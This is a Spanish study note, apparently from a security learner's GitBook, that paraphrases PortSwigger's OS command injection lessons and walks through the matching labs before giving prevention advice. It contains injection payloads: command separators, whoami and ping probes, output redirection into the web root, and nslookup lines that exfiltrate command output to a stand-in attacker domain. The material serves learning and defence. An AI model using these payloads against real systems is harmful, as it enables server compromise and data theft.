---
description: https://portswigger.net/web-security/os-command-injection
---

# OS command injection

En esta sección, explicaremos qué es OS command injection, describiremos cómo se pueden detectar y explotar las vulnerabilidades, explicaremos algunos comandos y técnicas útiles para diferentes sistemas operativos y resumiremos cómo evitar la inyección de comandos del sistema operativo.

![](<../../.gitbook/assets/image (98).png>)

## What is OS command injection?

OS command injection (también conocida como shell injection) es una vulnerabilidad de seguridad web que permite a un atacante ejecutar comandos arbitrarios del sistema operativo (SO) en el servidor que ejecuta una aplicación y, por lo general, compromete completamente la aplicación y todos sus datos. Muy a menudo, un atacante puede aprovechar una vulnerabilidad de OS command injection para comprometer otras partes de la infraestructura de alojamiento, explotando las relaciones de confianza para pivotar el ataque a otros sistemas dentro de la organización.

## Executing arbitrary commands

Considere una aplicación de compras que permite al usuario ver si un artículo está en stock en una tienda en particular. Se accede a esta información a través de una URL como:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

Para proporcionar la información de stock, la aplicación debe consultar varios sistemas heredados. Por razones históricas, la funcionalidad se implementa llamando a un comando de shell con los ID de producto y almacén como argumentos:

`stockreport.pl 381 29`

Este comando genera el estado de stock del artículo especificado, que se devuelve al usuario. Dado que la aplicación no implementa ninguna defensa contra la inyección de comandos del sistema operativo, un atacante puede enviar la siguiente entrada para ejecutar un comando arbitrario:

`& echo aiwefwlguh &`

Si esta entrada se envía en el parámetro productID, el comando ejecutado por la aplicación es:

stockreport.pl & echo aiwefwlguh & 29

El comando echo simplemente hace que la cadena suministrada se haga eco en la salida, y es una forma útil de probar algunos tipos de inyección de comandos del sistema operativo. El carácter & es un separador de comandos de shell, por ende se ejecuta es en realidad tres comandos separados uno tras otro. Como resultado, el resultado devuelto al usuario es:

`Error - productID was not provided`

`aiwefwlguh`

`29: command not found`

* El comando `stockreport.pl` original se ejecutó sin los argumentos esperados, por lo que devolvió un mensaje de error.&#x20;
* Se ejecutó el comando de `echo` inyectado y la cadena suministrada se hizo eco en la salida.&#x20;
* El argumento original `29` se ejecutó como un comando, lo que provocó un error.

Colocar el separador de comandos "&" después del comando inyectado es generalmente útil porque separa el comando inyectado de lo que sigue al punto de inyección. Esto reduce la probabilidad de que lo que sigue impida que el comando inyectado se ejecute.

### Lab: OS command injection, simple case

Verificamos el stock de un producto e interceptamos la petición.

![](<../../.gitbook/assets/image (102).png>)

Podemos ver que se transmiten ciertos datos, la mandamos al repeater. (ctrl + r)

![](<../../.gitbook/assets/image (84).png>)

Generamos el payload y enviamos la petición, que contiene el nombre de usuario que ejecuta el servicio web:

`;echo+$(whoami)`

![](<../../.gitbook/assets/image (66).png>)

## Useful commands

Cuando ha identificado una vulnerabilidad OS command injection, generalmente es útil ejecutar algunos comandos iniciales para obtener información sobre el sistema que ha comprometido. A continuación se muestra un resumen de algunos comandos que son útiles en plataformas Linux y Windows:

| Proposito del comando     | Linux       | Windows       |
| ------------------------- | ----------- | ------------- |
| Nombre del usuario actual | whoami      | whoami        |
| Sistema operativo         | uname -a    | ver           |
| Configuración de red      | ifconfig    | ipconfig /all |
| Conexiones de red         | netstat -an | netstat -an   |
| Running processes         | ps -ef      | tasklist      |

## Blind OS command injection vulnerabilities

Muchas instancias de inyección de comandos del sistema operativo son vulnerabilidades ciegas. Esto significa que la aplicación no devuelve el resultado del comando dentro de su respuesta HTTP. Las vulnerabilidades ciegas aún se pueden explotar, pero se requieren diferentes técnicas.

Considere un sitio web que permita a los usuarios enviar comentarios sobre el sitio. El usuario introduce su dirección de correo electrónico y su mensaje de comentarios. A continuación, la aplicación del lado del servidor genera un correo electrónico a un administrador del sitio que contiene los comentarios. Para hacer esto, llama al programa de correo con los detalles enviados. Por ejemplo:

`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

La salida del comando mail (si la hay) no se devuelve en las respuestas de la aplicación, por lo que el uso de la carga útil de `echo` no sería efectivo. En esta situación, puede utilizar una variedad de otras técnicas para detectar y explotar una vulnerabilidad.

## Detecting blind OS command injection using time delays

Puede utilizar un comando inyectado que desencadenará un retraso de tiempo, lo que le permitirá confirmar que el comando se ejecutó en función del tiempo que tarda la aplicación en responder. El comando ping es una forma efectiva de hacerlo, ya que le permite especificar el número de paquetes ICMP que desea enviar y, por lo tanto, el tiempo que tarda el comando en ejecutarse:

`& ping -c 10 127.0.0.1 &`

Este comando hará que la aplicación haga ping a su adaptador de red de loopback durante 10 segundos.

### Lab: Blind OS command injection with time delays

Llenamos la información del formulario y vemos como se tramitan los datos.

![](<../../.gitbook/assets/image (93).png>)

Capturamos la petición y la enviamos al repeater. (ctrl + r)

![](<../../.gitbook/assets/image (28).png>)

Ahora podemos realizar anide `` `ping -c 10 127.0.0.1` `` a email, podemos ver como se tardan ciertos segundos en devolver una respuesta. En este caso no es necesario anidarlo a email, puede ponerse en cualquier parámetro que esté en la petición

![](<../../.gitbook/assets/image (89).png>)

## Exploiting blind OS command injection by redirecting output

Puede redirigir la salida del comando inyectado a un archivo dentro de la raíz web que luego puede recuperar usando su navegador. Por ejemplo, si la aplicación sirve recursos estáticos desde la ubicación del sistema de archivos `/var/www/static`, puede enviar la siguiente entrada:

`& whoami > /var/www/static/whoami.txt &`

El carácter `>` envía la salida del comando `whoami` al archivo especificado. A continuación, puede utilizar el explorador para obtener https://vulnerable-website.com/whoami.txt para recuperar el archivo y ver la salida del comando inyectado.

### Lab: Blind OS command injection with output redirection

Enviamos el formulario igual que el ejército anterior, pero en este caso redireccionando la salida de un comando a un archivo, en una ruta donde podemos escribir.

`` `whoami+>+/var/www/images/result.txt` ``

![](<../../.gitbook/assets/image (91).png>)

Pensé que podíamos visitar el directorio /images para visualizar el resultado, pero no es así, debemos de aplicar alguna técnica de Directory transversal.

O bueno, basta con poner el nombre del archivo, ya que están en el mismo directorio.

![](<../../.gitbook/assets/image (113).png>)

## Exploiting blind OS command injection using out-of-band (OAST) techniques

Puede utilizar un comando inyectado que desencadenará una interacción de red out-of-band con un sistema que controle, utilizando técnicas OAST. Por ejemplo:

& nslookup kgji2ohoyw.web-attacker.com &

Esta carga útil utiliza el comando nslookup para provocar una búsqueda DNS para el dominio especificado. El atacante puede supervisar la búsqueda especificada y, por lo tanto, detectar que el comando se inyectó correctamente.

### Lab: Blind OS command injection with out-of-band interaction

En curso (necesito un servidor DNS o burpsuite premium)...

### Lab: Blind OS command injection with out-of-band data exfiltration

El canal out-of-band también proporciona una manera fácil de exfiltrar la salida de los comandos inyectados:

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

Esto provocará una búsqueda DNS en el dominio del atacante que contiene el resultado del comando whoami:

`wwwuser.kgji2ohoyw.web-attacker.com`

En curso (necesito un servidor DNS o burpsuite premium)...

## Ways of injecting OS commands

Se puede utilizar una variedad de metacaracteres de shell para realizar ataques de inyección de comandos del sistema operativo. Varios caracteres funcionan como separadores de comandos, lo que permite encadenar comandos. Los siguientes separadores de comandos funcionan tanto en sistemas basados en Windows como en Unix (abajo hay un enlace con mas):

* &
* &&
* |
* ||

Los siguientes separadores de comandos solo funcionan en sistemas basados en Unix:

* ;
* Newline (0x0a or \n)

En sistemas basados en Unix, también puede usar backticks o el carácter dollar para realizar la ejecución en línea de un comando inyectado dentro del comando original:

* \` injected command \`
* $( injected command )

Tenga en cuenta que los diferentes metacaracteres de shell tienen comportamientos sutilmente diferentes que podrían afectar si funcionan en ciertas situaciones y si permiten la recuperación de la salida de comandos o son útiles solo para la explotación ciega.

A veces, la entrada que controla aparece entre comillas en el comando original. En esta situación, debe terminar el contexto citado (usando " o ') antes de usar metacaracteres de shell adecuados para inyectar un nuevo comando.

How to prevent OS command injection attacks[\
](https://twitter.com/share?url=https%3a%2f%2fportswigger.net%2fweb-security%2fos-command-injection%2flab-blind-out-of-band-data-exfiltration\&text=Lab%3a+Blind+OS+command+injection+with+out-of-band+data+exfiltration+%7c+Web+Security+Academy%0A)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Con mucho, la forma más efectiva de prevenir las vulnerabilidades de inyección de comandos del sistema operativo es nunca llamar a los comandos del sistema operativo desde el código de la capa de aplicación. En prácticamente todos los casos, existen formas alternativas de implementar la funcionalidad requerida utilizando API de plataforma más seguras.

Si se considera inevitable llamar a los comandos del sistema operativo con la entrada proporcionada por el usuario, se debe realizar una validación de entrada sólida. Algunos ejemplos de validación efectiva incluyen:

* Validación con una lista blanca de valores permitidos.&#x20;
* Validar que la entrada es un número.&#x20;
* Validar que la entrada contiene solo caracteres alfanuméricos, ninguna otra sintaxis o espacio en blanco.

Nunca intente desinfectar la entrada escapando de los metacaracteres de shell. En la práctica, esto es demasiado propenso a errores y vulnerable por un atacante experto.



{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" %}

{% embed url="http://faculty.salina.k-state.edu/tim/unix_sg/shell/metachar.html" %}
